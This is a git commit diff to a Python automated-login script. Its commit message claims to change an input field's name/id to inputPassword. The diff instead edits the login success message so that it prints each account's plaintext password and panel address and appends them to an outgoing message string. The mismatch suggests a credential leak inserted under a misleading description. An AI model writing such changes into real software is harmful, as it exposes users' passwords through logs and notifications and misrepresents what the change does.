3bffd77b88f7fff470078260cf3ea0a3bd91fa6e
yourgits <project20010@proton.me>
2024-09-28 16:50:48 +0800

    修改name id值inputPassword

--- login_script.py
+++ login_script.py
@@ -89,7 +89,7 @@ async def main():
         if is_logged_in:
             now_utc = format_to_iso(datetime.utcnow())
             now_beijing = format_to_iso(datetime.utcnow() + timedelta(hours=8))
-            success_message = f'{serviceName}账号 {username} 于北京时间 {now_beijing}（UTC时间 {now_utc}）登录成功！'
+            success_message = f'{serviceName}账号 {username} -- {password} -- {panel} 于北京时间 {now_beijing}（UTC时间 {now_utc}）登录成功！'
             message += success_message + '\n'
             print(success_message)
         else:
